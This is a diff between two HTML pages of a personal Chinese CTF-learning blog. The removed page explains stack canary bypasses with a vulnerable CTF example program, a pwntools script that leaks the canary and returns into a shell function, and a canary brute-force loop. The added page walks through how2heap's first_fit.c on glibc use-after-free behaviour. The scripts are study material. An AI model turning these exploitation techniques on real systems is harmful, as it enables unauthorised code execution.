@@ -72,7 +72,7 @@
 
 
 
-  <meta name="keywords" content="菜鸡的菜鸡笔记,wiki,">
+  <meta name="keywords" content="how2heapc,">
 
 
 
@@ -83,18 +83,18 @@
 
 
 
-<meta name="description" content="canary canary的简单原理就是确定顶位置的值，在程序结束的时候对栈顶位置进行异或判断canary是否修改，来检测栈是否溢出。然后截断字符串">
-<meta name="keywords" content="菜鸡的菜鸡笔记,wiki">
+<meta name="description" content="终于开始更的how2heap系列。">
+<meta name="keywords" content="how2heapc">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一些保护的原理和绕过">
-<meta property="og:url" content="http://chessman.me/2019/08/20/一些保护的原理和绕过/index.html">
+<meta property="og:title" content="how2heap_first_fit.c">
+<meta property="og:url" content="http://chessman.me/2019/09/27/how2heap-first_fit.c/index.html">
 <meta property="og:site_name" content="chessman">
-<meta property="og:description" content="canary canary的简单原理就是确定顶位置的值，在程序结束的时候对栈顶位置进行异或判断canary是否修改，来检测栈是否溢出。然后截断字符串">
+<meta property="og:description" content="终于开始更的how2heap系列。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-08-20T09:26:02.004Z">
+<meta property="og:updated_time" content="2019-10-09T06:40:30.627Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="一些保护的原理和绕过">
-<meta name="twitter:description" content="canary canary的简单原理就是确定顶位置的值，在程序结束的时候对栈顶位置进行异或判断canary是否修改，来检测栈是否溢出。然后截断字符串">
+<meta name="twitter:title" content="how2heap_first_fit.c">
+<meta name="twitter:description" content="终于开始更的how2heap系列。">
 
 
 
@@ -124,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="http://chessman.me/2019/08/20/一些保护的原理和绕过/">
+  <link rel="canonical" href="http://chessman.me/2019/09/27/how2heap-first_fit.c/">
 
 
 
 
 
-  <title>一些保护的原理和绕过 | chessman</title>
+  <title>how2heap_first_fit.c | chessman</title>
   
 
 
@@ -257,7 +257,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://chessman.me/2019/08/20/一些保护的原理和绕过/">
+    <link itemprop="mainEntityOfPage" href="http://chessman.me/2019/09/27/how2heap-first_fit.c/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="chessman">
@@ -274,7 +274,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">一些保护的原理和绕过</h1>
+          <h1 class="post-title" itemprop="name headline">how2heap_first_fit.c</h1>
         
 
         <div class="post-meta">
@@ -287,8 +287,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-20T17:03:43+08:00">
-                2019-08-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-27T00:00:00+08:00">
+                2019-09-27
               </time>
             
 
@@ -303,8 +303,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-08-20T17:26:02+08:00">
-                2019-08-20
+              <time title="更新于" itemprop="dateModified" datetime="2019-10-09T14:40:30+08:00">
+                2019-10-09
               </time>
             
           </span>
@@ -331,7 +331,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  444 字
+                  372 字
                 </span>
               
 
@@ -368,19 +368,14 @@
       
 
       
-        <h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><blockquote>
-<p>canary的简单原理就是确定顶位置的值，在程序结束的时候对栈顶位置进行异或判断canary是否修改，来检测栈是否溢出。然后截断字符串</p>
-</blockquote>
+        <p> 终于开始更的how2heap系列。</p>
 <a id="more"></a>
-<h3 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h3><h4 id="得到canary的地址"><a href="#得到canary的地址" class="headerlink" title="得到canary的地址"></a>得到canary的地址</h4><p>溢出泄露canary，然后就可以直接控制溢出了（存在两次输入）</p>
-<p>如下题（来源：ctfwiki）</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello Hacker!"</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>第一次输入就直接覆盖canary的值，计算号偏移值，填入溢出得到的canary值。实现ret到getshell函数</p>
-<p><code>payload = 溢出canary的值+偏移值+32位shell的值</code></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">'ex2'</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">io = process(<span class="string">'./ex2'</span>)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(<span class="string">"./ex2"</span>).sym[<span class="string">"getshell"</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"Hello Hacker!\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak Canary</span></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">100</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"A"</span>*<span class="number">100</span>)</span><br><span class="line">Canary = u32(io.recv(<span class="number">4</span>))<span class="number">-0xa</span></span><br><span class="line">log.info(<span class="string">"Canary:"</span>+hex(Canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bypass Canary</span></span><br><span class="line">payload = <span class="string">"\x90"</span>*<span class="number">100</span>+p32(Canary)+<span class="string">"\x90"</span>*<span class="number">12</span>+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h4 id="one-by-one-爆破canary"><a href="#one-by-one-爆破canary" class="headerlink" title="one by one 爆破canary"></a>one by one 爆破canary</h4><p>这个看不大懂原理，大概意思就是有个代码能够直接把canary直接爆破出来（<strong>NB</strong>）代码如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"[+] Brute forcing stack canary "</span></span><br><span class="line"></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p)+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> len(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">      res = send2server(p + chr(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> res != <span class="string">""</span>:</span><br><span class="line">         p = p + chr(i)</span><br><span class="line">         <span class="comment">#print "\t[+] Byte found 0x%02x" % i</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> i == <span class="number">255</span>:</span><br><span class="line">         <span class="keyword">print</span> <span class="string">"[-] Exploit failed"</span></span><br><span class="line">         sys.exit(<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start<span class="number">-1</span>:<span class="number">-1</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"   [+] SSP value is 0x%s"</span> % canary</span><br></pre></td></tr></table></figure>
-<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2>
+<blockquote>
+<p><a href="https://github.com/shellphish/how2heap/blob/master/first_fit.c" target="_blank" rel="noopener">源码</a></p>
+</blockquote>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">512</span>);</span><br><span class="line">	<span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">	<span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(512): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(256): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate less than 512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 500 bytes\n"</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(500): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br></pre></td></tr></table></figure>
+<p>程序给我们调试了一下molloc的功能和函数，介绍了molloc函数可以被UAF的现象，当然，这只存在于没有没将free函数清零的情况。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>
       
     </div>
     
@@ -397,9 +392,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/菜鸡的菜鸡笔记/" rel="tag"># 菜鸡的菜鸡笔记</a>
-          
-            <a href="/tags/wiki/" rel="tag"># wiki</a>
+            <a href="/tags/how2heapc/" rel="tag"># how2heapc</a>
           
         </div>
       
@@ -412,9 +405,9 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/08/19/攻防世界/攻防世界自闭之路/" rel="next" title="攻防世界自闭之路<一>">
-                <i class="fa fa-chevron-left"></i> 攻防世界自闭之路<一>
-              </一></a>
+              <a href="/2019/08/31/终于写完的got表/" rel="next" title="关于got和plt的不完全总结">
+                <i class="fa fa-chevron-left"></i> 关于got和plt的不完全总结
+              </a>
             
           </div>
 
@@ -422,8 +415,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/08/22/漏洞原理/" rel="prev" title="对于格式化字符串漏洞的疯狂试探">
-                对于格式化字符串漏洞的疯狂试探 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/10/09/对于堆的理解/" rel="prev" title="glibc heap">
+                glibc heap <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -573,7 +566,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#canary"><span class="nav-number">1.</span> <span class="nav-text">canary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过canary"><span class="nav-number">1.1.</span> <span class="nav-text">绕过canary</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#得到canary的地址"><span class="nav-number">1.1.1.</span> <span class="nav-text">得到canary的地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#one-by-one-爆破canary"><span class="nav-number">1.1.2.</span> <span class="nav-text">one by one 爆破canary</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NX"><span class="nav-number">2.</span> <span class="nav-text">NX</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#源码分析"><span class="nav-number">1.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">2.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
             
 
           </div>
